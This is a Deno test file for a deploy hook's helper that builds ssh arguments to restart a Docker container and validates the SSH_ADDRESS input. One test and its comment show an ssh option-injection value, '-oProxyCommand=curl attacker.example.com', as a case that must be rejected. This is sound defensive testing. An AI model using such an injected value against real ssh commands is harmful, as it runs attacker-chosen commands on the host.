// Tests for stacks/gatus/after.deploy.ts's pure helper.
// (No shell interaction — that runs via the deploy script.)
//
// parseSshAddress itself is covered by the shared-table agreement test
// in cli/server-keys.test.ts (proves this hook's inlined copy agrees
// with cli's parser on every case); these tests are about
// buildRestartCommand's own argv shape.

import { assertEquals, assertThrows } from "@std/assert"
import { buildRestartCommand } from "./after.deploy.ts"

Deno.test("buildRestartCommand: valid address — ConnectTimeout, BatchMode then '--' precedes the address", () => {
  const args = buildRestartCommand("user@192.0.2.10", "hl-gatus")
  assertEquals(args, [
    "-o",
    "ConnectTimeout=10",
    "-o",
    "BatchMode=yes",
    "--",
    "user@192.0.2.10",
    "docker",
    "restart",
    "hl-gatus",
  ])
})

Deno.test("buildRestartCommand: an ssh_config alias is accepted", () => {
  const args = buildRestartCommand("home", "hl-gatus")
  assertEquals(args, [
    "-o",
    "ConnectTimeout=10",
    "-o",
    "BatchMode=yes",
    "--",
    "home",
    "docker",
    "restart",
    "hl-gatus",
  ])
})

Deno.test("buildRestartCommand: carries the port from SSH_ADDRESS as -p", () => {
  const args = buildRestartCommand("user@192.0.2.10:2222", "hl-gatus")
  assertEquals(args, [
    "-o",
    "ConnectTimeout=10",
    "-o",
    "BatchMode=yes",
    "-p",
    "2222",
    "--",
    "user@192.0.2.10",
    "docker",
    "restart",
    "hl-gatus",
  ])
})

Deno.test("buildRestartCommand: a bare IPv6 address is accepted with no port", () => {
  const args = buildRestartCommand("2001:db8::1", "hl-gatus")
  assertEquals(args, [
    "-o",
    "ConnectTimeout=10",
    "-o",
    "BatchMode=yes",
    "--",
    "2001:db8::1",
    "docker",
    "restart",
    "hl-gatus",
  ])
})

Deno.test("buildRestartCommand: [IPv6]:port reaches ssh as a bare host + -p", () => {
  const args = buildRestartCommand("[2001:db8::1]:2222", "hl-gatus")
  assertEquals(args, [
    "-o",
    "ConnectTimeout=10",
    "-o",
    "BatchMode=yes",
    "-p",
    "2222",
    "--",
    "2001:db8::1",
    "docker",
    "restart",
    "hl-gatus",
  ])
})

Deno.test("buildRestartCommand: rejects an unbracketed IPv6 address followed by a port", () => {
  assertThrows(
    () => buildRestartCommand("2001:db8::1:2222", "hl-gatus"),
    Error,
    "invalid SSH_ADDRESS",
  )
})

Deno.test("buildRestartCommand: rejects a value starting with '-'", () => {
  // Without the "--" guard and this check, ssh would read this as an
  // option: "-oProxyCommand=curl attacker.example.com" runs a local
  // command as part of ssh's own option parsing, no shell involved.
  assertThrows(
    () => buildRestartCommand("-oProxyCommand=curl attacker.example.com", "hl-gatus"),
    Error,
    "invalid SSH_ADDRESS",
  )
})

Deno.test("buildRestartCommand: rejects a bare '-flag'", () => {
  assertThrows(
    () => buildRestartCommand("--", "hl-gatus"),
    Error,
    "invalid SSH_ADDRESS",
  )
})

Deno.test("buildRestartCommand: rejects a host starting with - even behind a user", () => {
  assertThrows(
    () => buildRestartCommand("user@-oProxyCommand", "hl-gatus"),
    Error,
    "invalid SSH_ADDRESS",
  )
})

Deno.test("buildRestartCommand: rejects a value with a space", () => {
  assertThrows(
    () => buildRestartCommand("host with space", "hl-gatus"),
    Error,
    "invalid SSH_ADDRESS",
  )
})

Deno.test("buildRestartCommand: rejects an empty string", () => {
  assertThrows(
    () => buildRestartCommand("", "hl-gatus"),
    Error,
    "invalid SSH_ADDRESS",
  )
})
